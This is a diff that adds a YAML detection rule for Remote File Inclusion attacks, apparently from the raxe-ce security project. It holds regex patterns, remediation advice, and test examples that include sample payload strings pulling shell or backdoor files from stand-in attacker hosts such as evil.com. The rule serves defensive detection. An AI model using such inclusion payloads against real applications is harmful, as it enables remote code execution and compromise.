@@ -1,0 +1,42 @@
+version: 1.0.0
+rule_id: cmd-202
+family: CMD
+sub_family: file_inclusion
+name: Remote File Inclusion (RFI) Attack Detection
+description: Detects Remote File Inclusion attempts using external URLs
+severity: critical
+confidence: 0.95
+patterns:
+- pattern: (?i)(?:include|require|load|import).*(?:https?|ftp|ftps):\/\/(?:(?!example\.com|localhost).)*
+  flags:
+  - IGNORECASE
+  timeout: 5.0
+- pattern: (?i)(?:file|url|path)=(?:https?|ftp):\/\/[^\s&]+\.(?:php|asp|jsp|txt)
+  flags:
+  - IGNORECASE
+  timeout: 5.0
+examples:
+  should_match:
+  - "include http://evil.com/shell.php"
+  - "require https://attacker.net/backdoor.txt"
+  - "file=http://malicious.com/payload.php"
+  should_not_match:
+  - "What is RFI?"
+  - "How to prevent remote file inclusion?"
+  - "include https://example.com/library"
+metrics:
+  precision: null
+  recall: null
+  f1_score: null
+  last_evaluated: null
+mitre_attack:
+- T1105
+metadata:
+  created: '2025-11-16'
+  updated: '2025-11-16'
+  author: raxe-ce
+  category: web_attacks
+rule_hash: null
+risk_explanation: File inclusion attacks (LFI/RFI) exploit file loading functionality to include malicious files from local or remote sources. This can lead to code execution, information disclosure, or complete application compromise.
+remediation_advice: Use strict allowlisting for file inclusion. Never construct file paths from user input. Implement path validation and sanitization. Disable remote file inclusion in language configurations. Deploy file inclusion attack detection.
+docs_url: https://github.com/raxe-ai/raxe-ce/wiki/CMD-202-Remote-File-Inclusion-(Rfi)
